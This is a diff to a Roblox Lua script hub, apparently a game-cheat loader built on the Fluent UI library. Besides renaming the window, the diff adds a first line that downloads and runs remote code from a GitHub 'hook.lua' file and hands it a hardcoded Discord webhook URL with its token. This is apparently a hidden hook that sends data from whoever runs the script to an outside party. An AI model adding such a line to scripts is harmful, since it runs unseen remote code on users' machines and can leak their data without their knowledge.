@@ -1,10 +1,12 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX/OneCreatorX/main/Scripts/web/hook.lua"))()("https://discord.com/api/webhooks/1260964416573149278/yMXSPJ7BxAipByRSzcK5fwWkuPSrgh7uBFqIdY80icoQLFACKuJS8vHGSAQnPzI6hxlR")()
+
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
 --------------------------------------------------------------------------------------------------------------------------------------------
 local Window = Fluent:CreateWindow({
-    Title = "11",
-    SubTitle = "By ete",
+    Title = "Test Hub Oficial",
+    SubTitle = "By dearyGT(fluent ui)",
     TabWidth = 160,
     Size = UDim2.fromOffset(450, 300),
     Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
